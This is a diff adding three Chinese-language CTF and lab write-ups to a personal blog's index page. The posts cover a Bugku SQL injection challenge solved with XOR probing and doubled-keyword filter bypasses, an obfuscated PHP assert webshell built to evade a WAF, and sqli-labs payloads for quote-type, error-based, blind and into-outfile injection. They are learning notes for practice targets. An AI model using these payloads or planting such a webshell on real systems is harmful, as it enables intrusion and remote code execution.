@@ -229,6 +229,380 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/bugku  多次/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zyw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zyw">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/bugku  多次/" itemprop="url">有趣的多次</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-18T00:13:43+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>做到bugku的一道注入题，叫做多次，特来跟大家分享一下</p>
+<p>①.打开之后看到url上有个?id=1，自然想到注入<br><a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p>
+<p>②.尝试注入<br>构造payload：?id=1’ union select1,2,3,4 limit 0,1%23<br>结果报错，不断变化数值发现一直报错，于是想到可能存在过滤，于是使用异或校验<br>这里解析一下异或校验：A^B,若AB同真同假，则返回正确页面，反之返回错误</p>
+<p>③异或判断<br>    1.构造payload:?id=1’^(length(“order”)!=0)%23<br>        返回错误界面，所以order没有被过滤<br>    2.构造payload：?id=1’^(length(“union”)!=0)%23<br>        返回正确页面，显然union被过滤<br>    etc………………<br>    不断构造，发现and,or，select都被过滤</p>
+<p>④过滤绕过<br>既然发现过滤问题，自然要进行过滤绕过，这里利用过滤没有循环的漏洞，复写构造，例如：anandd’<br>具体发现方法可以将复写结果用上述方法进行验证<br>下面进行构造：<br>payload=?id=-1’ uniounionn selecselectt 1,2 limit 0,1%23<br>此时结果成功回显2，于是成功找到注入点</p>
+<p>⑤逐步注入<br>接下来就简单了，逐步进行注入即可，此处不做详述<br>这里值得注意的就是information因为包含or,所以得写成infoorrmation<br>同时表名有两个，第一个为第一个flag,第二个为下一关入口地址</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/17/扫描目录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zyw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zyw">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/17/扫描目录/" itemprop="url">过狗一句话</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-17T22:48:45+08:00">
+                2018-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>做到BUGKU的过狗一句话，这里学到一个扫描目录的方法，一定程度上解决了御剑的问题。<br>一句话如下：<br>    &lt;?php $poc = “a#s#s#e#r#t”;<br>    $poc_1 = explode(“#”, $poc);<br>    $poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];（***）<br>    $poc_2($_GET[‘s’])<br>    ?&gt;<br>扫描如下：<br>    ?s=print_r(scandir(‘./‘))</p>
+<p>注：这里有个疑问，（***）行到底做了啥</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/注入点类型/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zyw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zyw">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/16/注入点类型/" itemprop="url">注入点类型</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-16T23:36:05+08:00">
+                2018-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="date-2018-11-16"><a href="#date-2018-11-16" class="headerlink" title="date: 2018.11.16"></a>date: 2018.11.16</h2><p>好不容易搭建好了sqli-labs,做一做，让我发现很多的不足，原来我对注入点的类型一知半解（可怕！！！）<br>下面边做边总结遇到的类型：<br>①我最熟悉，且之前仅知道的一种情况：单引号类型<br>    具体如下：$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>    构造方法：?id=1’%23</p>
+<p>②纯数值:<br>    具体如下：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>    构造方法：?id=1%23</p>
+<p>③用括号括起来：<br>    具体如下：$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br>    构造方法：?id=1’)%23</p>
+<p>④双引号：<br>    具体如下：$sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br>    构造方法：?id=1”)%23<br>    说明：因为双引号可以包含单引号，所以此时用单引号不会报错<br>        另外这个双引号与之前哪个对应？这点我很迷，难道是表示字符串的那个？</p>
+<p>⑤双注入：<br>    具体说明见：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a><br>    固定模式：?id=-1’ union select count(<em>),2,concat((select database()),floor(rand()</em>2))as a from information_schema.tables group by a%23<br>    问题：1.这里怎么知道是双注入。<br>         2.这里怎么知道union的注入点在哪？</p>
+<p>⑥信息导出到外部文件：<br>    模式：select A into outfile B        其中A可以写马，B是文件路径及文件名</p>
+<p>⑦布尔盲注以及时间盲注：<br>     布尔：通过界面返回的正确与否判断<br>     时间：通过延迟判断，一般用到if()        eg：if（length(database())&gt;999999,0,sleep(5)）</p>
+<p>⑧引号包装：<br>     具体如下：$uname=’”‘.$uname.’”‘;<br>     注意这里使用双引号把$uname包装了，注入类型变为了双引号</p>
+<p>⑨</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/02/sql注入（二）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -783,7 +1157,7 @@ print (result)
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
